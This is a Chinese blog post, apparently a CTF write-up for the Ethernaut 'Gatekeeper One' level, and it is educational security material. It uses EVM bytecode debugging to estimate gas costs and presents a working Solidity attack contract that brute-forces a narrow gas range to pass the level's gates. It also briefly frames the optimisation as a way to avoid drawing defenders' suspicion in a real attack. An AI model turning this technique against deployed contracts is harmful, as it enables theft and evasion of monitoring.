---
layout: post
title:  巧用debug字节码分析进行gas分析优化攻击
categories: [Solidity,区块链安全,智能合约]
excerpt: 我利用了remix的debug进行gas_fee分析，优化了攻击合约，使得攻击时间缩短更加精确.....
---

## smeet it 

最近在ethernautCTF中，完成了Gatekeeper One这个关卡，进行一些思考，实验，获得一些debug上的一些心得。

为什么Debug？

![](..\images\debug_1.png)

 

我们知道通过第二道gate时，我们需要把gasfee为8191的倍数。如果直接爆破（如下）非常耗时，且繁琐。

```soli
for(uint256 i = 0 ; i < 8191 ; i++){
    (bool result,bytes memory data) = address(gkepOne).call{gas:
      300000 + i }
      (abi.encodeWithSignature("enter(bytes8)",key));
      if(result){
        break;
      }
}
```



由于gaslimit的限制，你可能根本运行不到足够的次数就因为gasfee不足而失败。那么只可以把8191次进行拆分，分多比交易进行，非常耗时。如果在实战中，防御者可能会因为你频繁的失败交易而产生监控和怀疑，所以考虑分析gas_fee的具体损失，优化这个攻击代码。

# Gas

![](..\images\debug_2.png)

以太坊的EVM最终将代码转换为机器码，我们用汇编代码查看每一个step具体的gas消耗。你可以在[黄皮书](https://ethereum.github.io/yellowpaper/paper.pdf)查看这些信息。

## Let's do it



### <font color=red >思路分析：</font>

**<font color=red >如果我们知道大概的一个gas耗费情况值，是不是可以定义一个较小的区间，而不是0~8191这样的区间。  具体如下：</font>**

```sol
for(uint256 i = 0 ; i < x ; i++){
    (bool result,bytes memory data) = address(gkepOne).call{gas:
         x + y + 8191*3 }  //这里可以*3  *4，但要保证gasfee足够 
      (abi.encodeWithSignature("enter(bytes8)",key));
     if(result){
        break;
     }
}
```



**<font color=red >x+y包含gate2之前所有的gasfee。</font>**

## debug分析：

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract GatekeeperOne {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifer gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

我先跑一遍Gatekeeper One基础代码，发送了一个 enter 的交易。

先上结论，debug时候，这个交易首先会因为用户调用消耗一部分gas。 剩余的gas才是进入到合约中的初始gas，之后init一下合约，然后init函数，然后根据顺序先到gateOne验证，然后再到gateTwo，最后到gateThree。

这几个步骤都是花费gas。



![](..\images\debug_3.png)

![](..\images\debug_4.png)

上述两个就是init 合约 和 init 函数时候消耗的gas。下列是所有操作的具体gas（分析到gate2 因为我们之需要获得gate2之前的gas消耗情况）

```soli
call 合约    21288
init 合约    97
init 函数    60
gateOne     87 //这里是我跑Attack合约时候获得的，可以看到图中，我修改了gateOne，目的是查看gate2的
gatetwo(部分)     7 //gatetwo的取值的根据下面图中的汇编代码计算的，我们只需要EVM存储在内存时，之前的gas
```

![](..\images\debug_5.png)

此时在执行gatetwo，0202这个操作把gas存储在了stack中，所以到这里就是我们分析gas的终点，之后会用这个gas进行8191的取余操作。而在gatetwo中这个0202操作之前的gas仅仅只有7.

因为这是直接调用合约，如果满足gate1要求下，必须用合约远程call调用实现（call 可以定义gas）。

```sol
  function call() public {
      (bool result,bytes memory data) = address(gkepOne).call{gas:300000}
      (abi.encodeWithSignature("enter(bytes8)",0x1234567812345678));
    }
```

调用后，我发现call合约这个操作消耗的gas是计算在调用者合约中的。也就是说上面call合约这个操作我们不需要计算在gas消耗情况中，而且在这次调用中，我也知道了gate1 的gas消耗是 87.

![](..\images\debug_6.png)

那么我们计算的gasfee = 97 + 60 + 87 + 7 = 251，黄皮书中提到 由于solidity 版本不同，环境等原因，这个耗费随着版本更新是有差别的。（但这个值应该都不会有很大出入，所以我们依然可以定义一个域用来完成这次攻击）

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./GatekeeperOne.sol";
contract GateAttack {
    GatekeeperOne public gkepOne;
    uint256 public flag ;
    bytes8 txo16 = 0xcb342D8a64d57395;
    bytes8 key = txo16 & 0xffffffff0000ffff;
  constructor(address _gkepOne) public {
     gkepOne = GatekeeperOne(_gkepOne);
  }
  function letmein() public {
    
      for(uint256 i = 0 ; i < 22 ; i++){
          (bool result,bytes memory data) = address(gkepOne).call{gas:
            i + 240 + 8191*3 }  //251 = 240 + 11=>  2*11=22   (240 ~262)
            (abi.encodeWithSignature("enter(bytes8)",key));
            if(result){
              flag = i;
              break;
            }
      }
  }
}
```

这里我相信这个数值应该不会有太大出入，所以我进行了一次攻击，结果成功了。而它返回的数值是256，与我计算的251仅差5。

## 总结

这次攻击的目的除了从hacker角度考虑，更多的是想深入EVM内部，这对区块链安全从业者是至关重要的，同时再一次体现Debug的重要性，很多时候从底层出发，漏洞显而易见。